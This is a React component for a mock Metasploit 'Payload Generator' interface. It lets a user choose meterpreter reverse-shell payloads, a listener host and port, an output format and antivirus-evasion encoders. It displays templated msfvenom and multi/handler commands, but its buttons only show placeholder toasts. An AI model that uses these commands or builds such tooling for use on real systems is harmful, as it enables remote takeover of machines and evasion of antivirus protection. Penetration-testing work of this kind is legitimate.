
import { useState } from "react";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { ChevronsUpDown, Download, Copy, Code } from "lucide-react";
import { toast } from "sonner";

const PayloadGenerator = () => {
  const [payload, setPayload] = useState("windows/meterpreter/reverse_tcp");
  const [lhost, setLhost] = useState("0.0.0.0");
  const [lport, setLport] = useState("4444");
  const [format, setFormat] = useState("exe");
  const [encoding, setEncoding] = useState("none");
  const [generated, setGenerated] = useState(false);

  const handleGenerate = () => {
    toast.info("Payload generation initiated", {
      description: "In a real application, this would generate the actual payload via Python and Metasploit"
    });
    setGenerated(true);
  };

  const handleCopy = () => {
    toast.success("Command copied to clipboard");
  };

  const handleDownload = () => {
    toast.info("This would download the payload in a real application");
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <h1 className="text-2xl font-bold">Payload Generator</h1>
        <Button onClick={handleGenerate} className="bg-blue-600 hover:bg-blue-700">
          Generate Payload
        </Button>
      </div>
      
      <Tabs defaultValue="standard">
        <TabsList className="grid w-full grid-cols-3 bg-zinc-800">
          <TabsTrigger value="standard">Standard</TabsTrigger>
          <TabsTrigger value="encoded">Encoded</TabsTrigger>
          <TabsTrigger value="advanced">Advanced</TabsTrigger>
        </TabsList>
        
        <TabsContent value="standard" className="space-y-4 mt-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <Card className="bg-zinc-800 border-zinc-700">
              <CardHeader>
                <CardTitle>Payload Options</CardTitle>
                <CardDescription>Configure your payload settings</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="payload">Payload Type</Label>
                  <Select value={payload} onValueChange={setPayload}>
                    <SelectTrigger id="payload" className="bg-zinc-900 border-zinc-700">
                      <SelectValue placeholder="Select payload" />
                    </SelectTrigger>
                    <SelectContent className="bg-zinc-900 border-zinc-700">
                      <SelectItem value="windows/meterpreter/reverse_tcp">windows/meterpreter/reverse_tcp</SelectItem>
                      <SelectItem value="windows/meterpreter/reverse_https">windows/meterpreter/reverse_https</SelectItem>
                      <SelectItem value="linux/x86/meterpreter/reverse_tcp">linux/x86/meterpreter/reverse_tcp</SelectItem>
                      <SelectItem value="android/meterpreter/reverse_tcp">android/meterpreter/reverse_tcp</SelectItem>
                      <SelectItem value="osx/x64/meterpreter/reverse_tcp">osx/x64/meterpreter/reverse_tcp</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="lhost">LHOST (Listener Host)</Label>
                  <Input
                    id="lhost"
                    value={lhost}
                    onChange={(e) => setLhost(e.target.value)}
                    className="bg-zinc-900 border-zinc-700"
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="lport">LPORT (Listener Port)</Label>
                  <Input
                    id="lport"
                    value={lport}
                    onChange={(e) => setLport(e.target.value)}
                    className="bg-zinc-900 border-zinc-700"
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="format">Output Format</Label>
                  <Select value={format} onValueChange={setFormat}>
                    <SelectTrigger id="format" className="bg-zinc-900 border-zinc-700">
                      <SelectValue placeholder="Select format" />
                    </SelectTrigger>
                    <SelectContent className="bg-zinc-900 border-zinc-700">
                      <SelectItem value="exe">Windows EXE</SelectItem>
                      <SelectItem value="dll">Windows DLL</SelectItem>
                      <SelectItem value="elf">Linux ELF</SelectItem>
                      <SelectItem value="apk">Android APK</SelectItem>
                      <SelectItem value="macho">macOS Mach-O</SelectItem>
                      <SelectItem value="powershell">PowerShell</SelectItem>
                      <SelectItem value="python">Python</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              </CardContent>
            </Card>
            
            <Card className="bg-zinc-800 border-zinc-700">
              <CardHeader>
                <CardTitle>Output</CardTitle>
                <CardDescription>Generated payload commands and files</CardDescription>
              </CardHeader>
              <CardContent>
                {generated ? (
                  <div className="space-y-4">
                    <div className="space-y-2">
                      <Label>MSF Command</Label>
                      <div className="bg-zinc-900 p-3 rounded-md border border-zinc-700 font-mono text-xs text-green-400 relative">
                        msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format} -o payload.{format}
                        <Button 
                          variant="ghost" 
                          size="icon" 
                          className="absolute top-1 right-1 h-6 w-6" 
                          onClick={handleCopy}
                        >
                          <Copy className="h-3 w-3" />
                        </Button>
                      </div>
                    </div>
                    
                    <div className="space-y-2">
                      <Label>Handler Command</Label>
                      <div className="bg-zinc-900 p-3 rounded-md border border-zinc-700 font-mono text-xs text-green-400 relative">
                        use exploit/multi/handler
                        <br/>
                        set PAYLOAD {payload}
                        <br/>
                        set LHOST {lhost}
                        <br/>
                        set LPORT {lport}
                        <br/>
                        exploit -j
                        <Button 
                          variant="ghost" 
                          size="icon" 
                          className="absolute top-1 right-1 h-6 w-6" 
                          onClick={handleCopy}
                        >
                          <Copy className="h-3 w-3" />
                        </Button>
                      </div>
                    </div>
                    
                    <div className="bg-zinc-900 p-3 rounded-md border border-zinc-700">
                      <div className="flex items-center justify-between">
                        <div className="font-mono text-sm">payload.{format}</div>
                        <div className="text-xs text-zinc-400">12 KB</div>
                      </div>
                      <div className="mt-2 flex items-center gap-2">
                        <Button size="sm" variant="outline" className="border-zinc-700 text-xs" onClick={handleDownload}>
                          <Download className="mr-1 h-3 w-3" /> Download
                        </Button>
                        <Button size="sm" variant="outline" className="border-zinc-700 text-xs">
                          <Code className="mr-1 h-3 w-3" /> View Hex
                        </Button>
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="flex flex-col items-center justify-center h-[320px] text-center">
                    <ChevronsUpDown className="h-12 w-12 text-zinc-500 mb-4" />
                    <h3 className="text-lg font-medium mb-2">No Payload Generated</h3>
                    <p className="text-sm text-zinc-400">
                      Configure your payload options and click on "Generate Payload" to create a new payload.
                    </p>
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        </TabsContent>
        
        <TabsContent value="encoded" className="mt-4">
          <Card className="bg-zinc-800 border-zinc-700">
            <CardHeader>
              <CardTitle>Payload Encoding Options</CardTitle>
              <CardDescription>Configure encoding to help evade detection</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="encoder">Encoder</Label>
                  <Select value={encoding} onValueChange={setEncoding}>
                    <SelectTrigger id="encoder" className="bg-zinc-900 border-zinc-700">
                      <SelectValue placeholder="Select encoder" />
                    </SelectTrigger>
                    <SelectContent className="bg-zinc-900 border-zinc-700">
                      <SelectItem value="none">None</SelectItem>
                      <SelectItem value="x86/shikata_ga_nai">x86/shikata_ga_nai</SelectItem>
                      <SelectItem value="cmd/powershell_base64">cmd/powershell_base64</SelectItem>
                      <SelectItem value="x64/xor">x64/xor</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                
                <div className="space-y-2">
                  <Label htmlFor="iterations">Encoding Iterations</Label>
                  <Input
                    id="iterations"
                    defaultValue="1"
                    className="bg-zinc-900 border-zinc-700"
                  />
                </div>
              </div>
              
              <div className="bg-zinc-900 p-3 rounded-md border border-zinc-700">
                <p className="text-sm text-zinc-400">
                  Encoding can help bypass basic antivirus detection but may increase payload size. Multiple iterations can improve evasion but may impact stability.
                </p>
              </div>
            </CardContent>
            <CardFooter>
              <Button onClick={handleGenerate} className="bg-blue-600 hover:bg-blue-700">
                Generate Encoded Payload
              </Button>
            </CardFooter>
          </Card>
        </TabsContent>
        
        <TabsContent value="advanced" className="mt-4">
          <Card className="bg-zinc-800 border-zinc-700">
            <CardHeader>
              <CardTitle>Advanced Options</CardTitle>
              <CardDescription>Fine-tune payload generation with advanced settings</CardDescription>
            </CardHeader>
            <CardContent>
              <div className="bg-zinc-900 p-4 rounded-md border border-zinc-700 font-mono text-xs text-zinc-400">
                Advanced options will be implemented in the future version.
              </div>
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  );
};

export default PayloadGenerator;
